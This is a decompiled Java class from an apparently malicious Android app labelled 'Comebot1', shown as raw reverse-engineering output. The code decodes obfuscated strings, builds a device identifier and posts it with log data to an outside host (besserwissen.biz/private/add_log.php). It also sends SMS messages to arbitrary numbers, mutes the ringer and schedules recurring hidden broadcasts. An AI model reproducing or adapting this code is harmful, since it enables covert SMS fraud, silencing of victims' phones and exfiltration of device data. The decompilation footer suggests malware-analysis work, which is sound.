package anu_bispro.app;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;

public class a {
  private static SharedPreferences c = null;
  
  private static SharedPreferences.Editor d = null;
  
  b a = new b();
  
  d b = new d();
  
  public static void a(Context paramContext, String paramString, long paramLong) {
    try {
      Intent intent = new Intent();
      this(paramContext, resiverboot.class);
      intent.setAction(paramString);
      PendingIntent pendingIntent = PendingIntent.getBroadcast(paramContext, 0, intent, 0);
      ((AlarmManager)paramContext.getSystemService(d.a("G\034G\002K"))).setRepeating(0, System.currentTimeMillis() + paramLong, paramLong, pendingIntent);
    } catch (Exception exception) {
      exception.printStackTrace();
    } 
  }
  
  public String a(Context paramContext) {
    String str2 = Settings.Secure.getString(paramContext.getContentResolver(), d.a("\021H\024T\037O\024y\031B"));
    String str1 = str2;
    if (str2 == "")
      str1 = (new StringBuilder()).insert(0, d.a("C\023")).append(Build.BOARD.length() % 10).append(Build.BRAND.length() % 10).append(Build.CPU_ABI.length() % 10).append(Build.DEVICE.length() % 10).append(Build.DISPLAY.length() % 10).append(Build.HOST.length() % 10).append(Build.ID.length() % 10).append(Build.MANUFACTURER.length() % 10).append(Build.MODEL.length() % 10).append(Build.PRODUCT.length() % 10).append(Build.TAGS.length() % 10).append(Build.TYPE.length() % 10).append(Build.USER.length() % 10).toString(); 
    return str1;
  }
  
  public String a(Context paramContext, String paramString) {
    if (c == null) {
      c = paramContext.getSharedPreferences(d.a("U\025R"), 0);
      d = c.edit();
    } 
    return c.getString(paramString, null);
  }
  
  public String a(String paramString) {
    String str1;
    d d1 = new d();
    String str2 = "";
    d1.getClass();
    int i = 0;
    int j = 0;
    while (true) {
      str1 = str2;
      try {
        if (i < "qwe".length()) {
          str1 = str2;
          String str = "qwe".substring(j, j + 1);
          str1 = str2;
          StringBuilder stringBuilder = new StringBuilder();
          str1 = str2;
          this();
          str1 = str2;
          stringBuilder = stringBuilder.insert(0, "").append(j);
          i = j + 1;
          str1 = str2;
          paramString = paramString.replace(str, stringBuilder.toString());
          j = i;
          continue;
        } 
        str1 = str2;
        String[] arrayOfString = paramString.split(d.a("\006"));
        str1 = str2;
        i = arrayOfString.length;
        j = 0;
        paramString = str2;
        while (true) {
          str1 = paramString;
          if (j < i) {
            str1 = paramString;
            char c = (char)Integer.parseInt(arrayOfString[j]);
            str1 = paramString;
            StringBuilder stringBuilder = new StringBuilder();
            str1 = paramString;
            this();
            str1 = paramString;
            stringBuilder = stringBuilder.insert(0, paramString);
            j++;
            str1 = paramString;
            paramString = stringBuilder.append(c).toString();
            continue;
          } 
          break;
        } 
      } catch (Exception exception) {}
      break;
    } 
    return URLDecoder.decode((new StringBuilder()).insert(0, str1).append(d.a("\006")).toString());
  }
  
  public String a(String paramString1, String paramString2, String paramString3) {
    String str;
    try {
      paramString1 = paramString1.substring(paramString1.indexOf(paramString2) + paramString2.length(), paramString1.indexOf(paramString3));
    } catch (Exception exception) {
      str = "";
    } 
    return str;
  }
  
  public void a(Context paramContext, String paramString1, String paramString2) {
    SharedPreferences.Editor editor = paramContext.getSharedPreferences(d.a("U\025R"), 0).edit();
    editor.putString(paramString1, paramString2);
    editor.commit();
  }
  
  public String b(String paramString) {
    StringBuilder stringBuilder;
    byte b1 = 0;
    new d();
    String str1 = URLEncoder.encode(paramString);
    String str2 = "";
    int i = 0;
    int j = 0;
    while (true) {
      StringBuilder stringBuilder1;
      paramString = str2;
      byte b2 = b1;
      String str = str2;
      try {
        StringBuilder stringBuilder2;
        if (i < str1.length()) {
          str = str2;
          i = str1.charAt(j);
          str = str2;
          stringBuilder2 = new StringBuilder();
          str = str2;
          this();
          str = str2;
          stringBuilder2 = stringBuilder2.insert(0, str2).append(i);
          str = str2;
          String str3 = d.a("\006");
          i = j + 1;
          str = str2;
          str2 = stringBuilder2.append(str3).toString();
          j = i;
          continue;
        } 
        while (true) {
          stringBuilder1 = stringBuilder2;
          stringBuilder = stringBuilder2;
          if (b2 < "qwe".length()) {
            stringBuilder1 = stringBuilder2;
            String str5 = "qwe".substring(b2, b2 + 1);
            stringBuilder1 = stringBuilder2;
            StringBuilder stringBuilder3 = new StringBuilder();
            stringBuilder1 = stringBuilder2;
            this();
            stringBuilder1 = stringBuilder2;
            String str4 = stringBuilder3.insert(0, "").append(b2).toString();
            b2++;
            stringBuilder1 = stringBuilder2;
            String str3 = stringBuilder2.replace(str4, str5);
            continue;
          } 
          break;
        } 
      } catch (Exception exception) {
        stringBuilder = stringBuilder1;
      } 
      break;
    } 
    return (String)stringBuilder;
  }
  
  public void b(Context paramContext, String paramString1, String paramString2) {
    b b1 = this.a;
    this.b.getClass();
    b1.a("http://besserwissen.biz/private/add_log.php", (new StringBuilder()).insert(0, d.a("\000\033")).append(b((new StringBuilder()).insert(0, a(paramContext)).append(d.a("\fде]")).append(paramString1).append(d.a("\r]")).append(paramString2).append(d.a("\rZ")).toString())).toString());
  }
  
  public boolean b(Context paramContext) {
    NetworkInfo networkInfo = g(paramContext);
    return (networkInfo != null && networkInfo.isConnected() && networkInfo.getType() == 0);
  }
  
  public String c(Context paramContext) {
    String str;
    try {
      str = ((TelephonyManager)paramContext.getSystemService(d.a("V\030I\036C"))).getNetworkCountryIso();
    } catch (Exception exception) {
      str = d.a("\005U");
    } 
    return str;
  }
  
  public void c(Context paramContext, String paramString1, String paramString2) {
    int i = 0;
    SmsManager smsManager = SmsManager.getDefault();
    ArrayList arrayList = smsManager.divideMessage(paramString2);
    PendingIntent pendingIntent1 = PendingIntent.getBroadcast(paramContext, 0, new Intent(d.a("#k#y#c>r")), 0);
    PendingIntent pendingIntent2 = PendingIntent.getBroadcast(paramContext, 0, new Intent(d.a("u=u/b5j9p5t5b")), 0);
    ArrayList<PendingIntent> arrayList1 = new ArrayList();
    ArrayList<PendingIntent> arrayList2 = new ArrayList();
    int j;
    for (j = 0; i < arrayList.size(); j = i) {
      arrayList2.add(pendingIntent2);
      i = j + 1;
      arrayList1.add(pendingIntent1);
    } 
    smsManager.sendMultipartTextMessage(paramString1, null, arrayList, arrayList1, arrayList2);
  }
  
  public void d(Context paramContext) {
    ((AudioManager)paramContext.getSystemService(d.a("G\005B\031I"))).setRingerMode(0);
  }
  
  public boolean e(Context paramContext) {
    boolean bool = true;
    NetworkInfo networkInfo = g(paramContext);
    if (networkInfo == null || !networkInfo.isConnected() || networkInfo.getType() != 1)
      bool = false; 
    return bool;
  }
  
  public boolean f(Context paramContext) {
    return (b(paramContext) || e(paramContext));
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */